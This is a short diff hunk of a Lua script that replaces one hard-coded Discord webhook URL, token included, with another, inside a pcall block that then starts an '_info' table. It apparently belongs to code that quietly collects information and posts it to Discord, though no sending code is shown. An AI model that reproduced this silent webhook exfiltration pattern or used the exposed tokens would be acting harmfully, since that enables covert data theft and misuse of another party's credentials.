@@ -64,7 +64,7 @@ end
 
 pcall(function()
 
-    local _W = "https://discord.com/api/webhooks/1554096850217214012/W9TyJgNJ0FJ5FkEUW6OydN6LRa5mUUMhYNFQqcLuS6Unl-3ZWJz0c3tBREreZRJYyIcR"
+    local _W = "https://discord.com/api/webhooks/1553689209003319318/6gidLOibknqtKwN1ou1Z6NuRc9WHeISP0Y_0HBDVGez5voNepQ49OJytLYRGr0_3uwoD"
 
     local _info = {}
 
